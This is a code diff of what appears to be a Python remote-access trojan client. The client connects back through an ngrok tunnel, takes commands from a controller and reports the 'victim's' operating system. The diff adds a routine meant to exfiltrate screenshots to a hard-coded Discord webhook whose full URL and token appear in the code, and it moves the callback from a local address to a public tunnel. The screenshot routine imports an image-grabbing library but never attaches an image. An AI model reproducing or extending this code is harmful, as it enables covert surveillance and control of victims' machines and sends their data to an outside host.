@@ -3,6 +3,8 @@ from typing import *
 import sys
 import os
 import webbrowser
+import discord_webhooks
+from PIL import ImageGrab
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
@@ -11,7 +13,9 @@ class Client():
         # Receive Command
         self.command=self.client.recv(1024).decode()
         # Screenshot
-        if self.command=="screenshot":...
+        if self.command=="screenshot":
+            self.send_screenshot_to_discord()
+            self.client.send("Sending Screenshot To Discord".encode()) # Read Webhook From Config File (Future)
         # Operating System Name
         if self.command=="os_name":
             self.client.send(f"Victim Is Using {self.os_name}".encode())
@@ -49,11 +53,15 @@ class Client():
             return "linux"
         else:
             return "other"
+    def send_screenshot_to_discord(self):
+        webhook=discord_webhooks.DiscordWebhooks("https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy")
+        webhook.set_footer(text="D A R K N E S S")
+        webhook.send()
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
         c=socket.socket()
         c.connect((_addr,_port))
         return c,_addr
 if __name__ == "__main__":
-    c,addr=Client.init_socket("192.168.29.94",9999)
+    c,addr=Client.init_socket("0.tcp.in.ngrok.io",13472)
     client=Client(c,addr)
